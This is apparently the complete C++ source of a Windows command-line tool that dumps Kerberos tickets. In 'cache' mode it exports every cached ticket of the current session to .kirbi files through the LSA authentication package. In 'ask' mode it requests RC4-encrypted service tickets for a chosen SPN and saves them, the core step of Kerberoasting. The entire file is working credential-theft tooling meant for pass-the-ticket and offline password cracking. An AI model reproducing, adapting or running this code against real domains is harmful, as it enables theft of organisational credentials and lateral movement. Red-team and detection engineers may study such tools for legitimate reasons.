//https://github.com/lunatic0x0/
#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <ntsecapi.h>
#pragma comment(lib, "Secur32.lib")

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_HANDLE_NO_LONGER_VALID 0xC0190028

STRING	kerberosPackageName = { 8, 9, (PCHAR)MICROSOFT_KERBEROS_NAME_A };
DWORD	KerberosAuthenticationPackageID = 0;
BOOL	isAuthenticationPackage_Kerberos = FALSE;
HANDLE	hLSA = NULL;
const wchar_t IllegalChars[] = { L'\\', L'/', L':', L'*', L'?', L'\"', L'<', L'>', L'|' };

NTSTATUS Initiate_Kerberos(){
	NTSTATUS status = LsaConnectUntrusted(&hLSA);
	if (NT_SUCCESS(status)){
		status = LsaLookupAuthenticationPackage(hLSA, &kerberosPackageName, &KerberosAuthenticationPackageID);
		isAuthenticationPackage_Kerberos = NT_SUCCESS(status);
	}
	return status;
}

NTSTATUS DoKerberosAuthentication(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID* ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus){
	NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
	if (hLSA && isAuthenticationPackage_Kerberos)
		status = LsaCallAuthenticationPackage(hLSA, KerberosAuthenticationPackageID, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
	return status;
}

BOOL RetrieveTicketfromCache() {

	NTSTATUS status, PackageStatus;
	KERB_QUERY_TKT_CACHE_REQUEST KerberosCacheRequest = { KerbQueryTicketCacheExMessage, {0, 0} };
	PKERB_QUERY_TKT_CACHE_EX_RESPONSE KerberosCacheResponse;
	PKERB_RETRIEVE_TKT_REQUEST KerberosRequest;
	PKERB_RETRIEVE_TKT_RESPONSE KerberosResponse;

	DWORD ResponseLength, i;
	wchar_t* filename;
	size_t count = 0x1000;

	HANDLE hFile;
	DWORD dwBytesWritten = 0;
	BOOL reussite = FALSE;

	wprintf(L"Calling LsaLookupAuthenticationPackage ....\n");
	Initiate_Kerberos();
	wprintf(L"Calling LsaCallAuthenticationPackage ....\n");
	status = DoKerberosAuthentication(&KerberosCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID*)&KerberosCacheResponse, &ResponseLength, &PackageStatus);
	if (NT_SUCCESS(status))
	{
		if (NT_SUCCESS(PackageStatus))
		{
			for (i = 0; i < KerberosCacheResponse->CountOfTickets; i++) {
				ResponseLength = sizeof(KERB_RETRIEVE_TKT_REQUEST) + KerberosCacheResponse->Tickets[i].ServerName.MaximumLength;
				if (KerberosRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, ResponseLength)) 
				{
					KerberosRequest->MessageType = KerbRetrieveEncodedTicketMessage;
					KerberosRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
					KerberosRequest->TicketFlags = KerberosCacheResponse->Tickets[i].TicketFlags;
					KerberosRequest->TargetName = KerberosCacheResponse->Tickets[i].ServerName;
					KerberosRequest->TargetName.Buffer = (PWSTR)((PBYTE)KerberosRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
					RtlCopyMemory(KerberosRequest->TargetName.Buffer, KerberosCacheResponse->Tickets[i].ServerName.Buffer, KerberosRequest->TargetName.MaximumLength);
					status = DoKerberosAuthentication(KerberosRequest, ResponseLength, (PVOID*)&KerberosResponse, &ResponseLength, &PackageStatus);
					if (NT_SUCCESS(status))
					{
						if (NT_SUCCESS(PackageStatus)) {
							if (filename = (wchar_t*)LocalAlloc(LPTR, count * sizeof(wchar_t))) {
								if (swprintf_s(filename, count, L"%wZ-%d.kirbi", &KerberosCacheResponse->Tickets[i].ServerName, i) > 0) {
									DWORD i, j;
									for (i = 0; filename[i]; i++)
										for (j = 0; j < ARRAYSIZE(IllegalChars); j++)
											if (filename[i] == IllegalChars[j])
												filename[i] = L'~';

									//wprintf(L"%ls\n", filename);
								}
								else {
									wprintf(L"Failed to create file name\n");
									LocalFree(filename);
									return false;
								}
							}
							else {
								wprintf(L"Failed to allocate memory for file name\n");
								return false;
							}

							hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
							if (WriteFile(hFile, KerberosResponse->Ticket.EncodedTicket, KerberosResponse->Ticket.EncodedTicketSize, &dwBytesWritten, NULL) && (KerberosResponse->Ticket.EncodedTicketSize == dwBytesWritten))
								reussite = FlushFileBuffers(hFile);
							CloseHandle(hFile);
							wprintf(L"Dumped %ls successfully\n", filename);
							LocalFree(filename);
							LsaFreeReturnBuffer(KerberosResponse);
						}
						else {
							wprintf(L"Invalid Package status\n");
							return false;
						}
					}
					else {
						wprintf(L"Failed to perform Kerberos Authentication\n");
						return false;
					}

					LocalFree(KerberosRequest);
				}
			}
			LsaFreeReturnBuffer(KerberosCacheResponse);
		}
		else {
			wprintf(L"Invalid Package status\n");
			return false;
		}
	}
	else {
		wprintf(L"Failed to perform Kerberos Authentication\n");
		return false;
	}
	return true;
}

BOOL AskTGSTicket(PCWCHAR Target) {
	NTSTATUS status, PackageStatus;
	PWCHAR ticketname = NULL;
	DWORD ResponseLength;
	USHORT dwTarget;
	HANDLE hFile;
	wchar_t* filename;
	size_t count = 0x1000;
	DWORD dwBytesWritten = 0;
	BOOL reussite = FALSE;
	PKERB_RETRIEVE_TKT_REQUEST KerberosRequest;
	PKERB_RETRIEVE_TKT_RESPONSE KerberosResponse;
	dwTarget = (USHORT)((wcslen(Target) + 1) * sizeof(wchar_t));
	ResponseLength = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;

	if (KerberosRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, ResponseLength)) {
		KerberosRequest->MessageType = KerbRetrieveEncodedTicketMessage;
		KerberosRequest->CacheOptions = KERB_RETRIEVE_TICKET_DEFAULT;
		KerberosRequest->EncryptionType = KERB_ETYPE_RC4_HMAC_NT;
		KerberosRequest->TargetName.Length = dwTarget - sizeof(wchar_t);
		KerberosRequest->TargetName.MaximumLength = dwTarget;
		KerberosRequest->TargetName.Buffer = (PWSTR)((PBYTE)KerberosRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
		RtlCopyMemory(KerberosRequest->TargetName.Buffer, Target, KerberosRequest->TargetName.MaximumLength);
		wprintf(L"Asking for: %wZ\n", &KerberosRequest->TargetName);
		wprintf(L"Calling LsaLookupAuthenticationPackage ....\n");
		Initiate_Kerberos();

		wprintf(L"Calling LsaCallAuthenticationPackage ....\n");
		status = DoKerberosAuthentication(KerberosRequest, ResponseLength, (PVOID*)&KerberosResponse, &ResponseLength, &PackageStatus);
		if (NT_SUCCESS(status))
		{
			if (NT_SUCCESS(PackageStatus)){
				KerberosRequest->CacheOptions |= KERB_RETRIEVE_TICKET_AS_KERB_CRED;
				status = DoKerberosAuthentication(KerberosRequest, ResponseLength, (PVOID*)&KerberosResponse, &ResponseLength, &PackageStatus);
				if (NT_SUCCESS(status)) {

					if (NT_SUCCESS(PackageStatus)) {
						if (filename = (wchar_t*)LocalAlloc(LPTR, count * sizeof(wchar_t))) {
							if (swprintf_s(filename, count, L"%ls.kirbi", Target) > 0) {
								DWORD i, j;
								for (i = 0; filename[i]; i++)
									for (j = 0; j < ARRAYSIZE(IllegalChars); j++)
										if (filename[i] == IllegalChars[j])
											filename[i] = L'~';

								hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
								if (WriteFile(hFile, KerberosResponse->Ticket.EncodedTicket, KerberosResponse->Ticket.EncodedTicketSize, &dwBytesWritten, NULL) && (KerberosResponse->Ticket.EncodedTicketSize == dwBytesWritten))
									reussite = FlushFileBuffers(hFile);
								CloseHandle(hFile);
								printf("Dumped %ls ticket successfully\n", filename);
								LocalFree(filename);
							}
							else {
								wprintf(L"Failed to create file name\n");
								LocalFree(filename);
								return false;
							}
						}
						else {
							wprintf(L"Failed to allocate memory for file name\n");
							return false;
						}
					}
					else {
						wprintf(L"Invalid Package status\n");
						return false;
					}
				}
				LsaFreeReturnBuffer(KerberosResponse);
			}
		}
		else {
			wprintf(L"Failed to perform Kerberos Authentication\n");
			return false;
		}
	}
	return true;
}


int wmain(int argc, wchar_t* argv[]){

	if (argc < 2) {
		wprintf(L"Usage: kerberos.exe cache\n/kerberos.exe ask <target SPN>");
		return 0;
	}

	PCWCHAR Target = argv[1];
	BOOL result;
	if (wcscmp(argv[1], L"cache") == 0) {
		result = RetrieveTicketfromCache();
		if (!result) {
			wprintf(L"[-] Failed to dump tickets from cache\n");
			return 0;
		}
	}
	else if (wcscmp(argv[1], L"ask") == 0) {
		Target = argv[2];
		result = AskTGSTicket(Target);
		if (!result) {
			wprintf(L"[-] Failed to ask ticket for the target: %ls\n", Target);
			return 0;
		}
	}
	else {
		wprintf(L"Usage: kerberos.exe cache\n/kerberos.exe ask <target SPN>");
		return 0;
	}

	return 0;
}
